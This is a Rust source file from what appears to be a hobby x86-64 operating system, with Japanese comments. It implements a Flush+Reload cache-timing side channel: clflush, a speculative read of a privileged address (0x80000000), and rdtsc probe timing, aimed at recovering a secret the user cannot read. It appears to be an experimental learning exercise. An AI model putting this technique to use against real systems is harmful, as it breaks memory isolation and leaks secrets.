use core::arch::asm;
use core::arch::x86_64::_mm_clflush;
use x86;

use crate::serial_print;
#[allow(unused_imports)]
use crate::{println,print, serial_println};

const PAGE_SIZE: usize = 4096;

#[inline(always)]
unsafe fn flush(addr: *const u8) {
    _mm_clflush(addr);
}

#[inline(always)]
unsafe fn flush_buffer(buffer: *const u8) {
    for i in 0..65 {
        flush(buffer.add(i * PAGE_SIZE));
    }
}

#[inline(always)]
unsafe fn probe(addr: *const u8) -> u64 {
    calc_access_time(
        #[inline(always)]
        || {
            addr.read_volatile();
        },
    )
}

#[inline(always)]
//unsafe fn guess_bit_once(seed: u8, buffer: *mut u8) -> u8 {
unsafe fn guess_bit_once(seed: u8, buffer: *mut u8) -> u8 {
    flush_buffer(buffer);

    /*
    ユーザ空間
    // 1足すとうまく動く（キャッシュが動くから?）
    buffer
        .add(((seed as usize) + 1) * PAGE_SIZE)
        .write_volatile(1);
    //serial_println!("{:p}", buffer.add(((seed as usize) * 2) * PAGE_SIZE));
    */

    // 例外起こしてすぐ戻るをやってもいい気がした→でも面白くなくない?（一応本質部分はできていますが...）
    // 飛び先のアドレスで予測されている（CPUは）
    // それを参考にしてトレーニングを施してみる（アドレスの一部を使っている）

    let p = 0x80000000 as *mut u8;
    //buffer.add(1).write_volatile(1);
    buffer.add(
        (*p as usize + 1) * PAGE_SIZE
    ).write_volatile(1);
    // カーネルへのアクセス

    /*loop{
        asm!("nop");
    }*/

    // ここに飛びたい
    (0..64)
        .min_by_key(|i| {
            let time = probe(buffer.add((i+1) * PAGE_SIZE));
            //serial_println!("{}: {}", i, time);
            time
        })
        .unwrap() as u8
}

fn calc_access_time<F: Fn()>(f: F) -> u64 {
    unsafe { asm!("mfence", "lfence") };
    let start = unsafe { x86::time::rdtsc() };
    unsafe { asm!("lfence") };
    f();
    unsafe { asm!("mfence", "lfence") };
    let end = unsafe { x86::time::rdtsc() };
    unsafe { asm!("lfence") };
    end - start
}

#[inline(never)]
unsafe fn guess_bit(seed: u8, buffer: *mut u8) -> u8 {
    const TRY_COUNT: usize = 10000;
    let mut hit_counts = [0; 64];

    for _ in 0..TRY_COUNT {
        hit_counts[guess_bit_once(seed, buffer) as usize] += 1;
    }

    hit_counts
        .iter()
        .enumerate()
        .max_by_key(|(i, &count)| {
            serial_println!("{}: {:10} ", i, count);
            count
        })
        .unwrap()
        .0 as u8
}

#[no_mangle]
pub extern "C" fn cache(sample: u8) {
    /*static SAMPLE: &'static str = "Hinata OS";
    let sample = SAMPLE.as_ptr();*/
    // セグメントレジスタとかを表示できるようにする（デバッグ情報を出力）
    // 権限が切り替わったらいいね
    // 最終的には、秘密の値のあるアドレスを渡して（そのアドレスはユーザから読めないようにする）推測できればOK
    let mut buffer = [0u8; PAGE_SIZE * 70];
    let result = unsafe { guess_bit(sample, buffer.as_mut_ptr()) };
    serial_println!("result: {}", result);

    /*for i in 0..64 {
        unsafe {
            //let result = guess_bit((sample >> i) & 1, buffer.as_mut_ptr());
            //println!("{} {}", (sample >> i) & 1, result);
            let result = guess_bit(i, buffer.as_mut_ptr());
            print!("{}", result);
        }
    }*/
    loop {}
}
